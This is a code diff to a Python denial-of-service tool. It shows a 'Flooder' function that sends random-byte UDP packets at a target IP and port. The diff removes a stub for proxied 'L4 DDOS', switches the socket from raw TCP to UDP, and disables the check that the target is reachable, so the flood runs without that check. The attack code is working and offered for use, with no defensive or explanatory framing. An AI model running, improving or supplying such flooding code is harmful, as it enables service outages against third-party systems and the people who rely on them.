@@ -34,31 +34,10 @@ def CheckValid():
         return True
     except:
         return False
-# Will implement Proxied L4 DDOS Later
-''' 
-def Proxies(file = sys.argv[3]):
-    if os.path.exists(file):
-        with open(file,"r")as file:
-            content = file.read().strip(" ").split("\n")
-        return content
-    else:
-        print(f"File \'{file}\' does not exist")
-        sys.exit(-1)
-
-def FormatCheck():
-    proxys = Proxies()
-    err = False
-    for prox in proxys:
-        if ":" not in prox:
-            err = True
-            break
-    if err:
-        print("Please format your proxies like ip:port each line and remove all white spaces")
-        sys.exit(-1)
-'''
+    
 def Flooder(**pHu):
     global count
-    sVar = socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_TCP)
+    sVar = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
     try:
         z3Payload = randbytes(bytesX)
         sendByte = sVar.sendto(z3Payload, (pHu['host_ip'],pHu['port']))
@@ -77,7 +56,7 @@ def Main():
         print(f.result())
         
 if __name__ == "__main__":
-    validity = CheckValid()
-    if validity == False:
-        sys.exit("This ip:port refused the connection")
+    #validity = CheckValid()
+    #if validity == False:
+    #    sys.exit("This ip:port refused the connection")
     Main()
